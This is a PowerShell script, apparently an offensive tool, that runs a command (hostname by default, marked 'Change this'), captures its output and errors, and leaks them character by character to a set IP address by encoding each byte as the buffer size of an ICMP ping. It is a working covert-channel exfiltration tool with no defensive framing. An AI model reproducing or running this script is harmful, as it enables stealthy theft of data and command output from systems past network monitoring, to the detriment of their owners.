$ip = "10.0.2.15" #Change this

# Clear the $Error variable to ensure we're capturing new errors
$Error.Clear()

# Executing a command and capture the output
$commandOutput = hostname #Change this
# Capture any errors that occurred
$errorOutput = $Error | Out-String
$Error.Clear()  # Clear the $Error variable again to avoid capturing previous errors

# Send the command output as ICMP requests
$commandOutput.ToCharArray() | ForEach-Object {
    Test-Connection -ComputerName $ip -Count 1 -BufferSize ([System.Text.Encoding]::ASCII.GetBytes($_)[0])
}

# Send the error output as ICMP requests
$errorOutput.ToCharArray() | ForEach-Object {
    Test-Connection -ComputerName $ip -Count 1 -BufferSize ([System.Text.Encoding]::ASCII.GetBytes($_)[0])
}
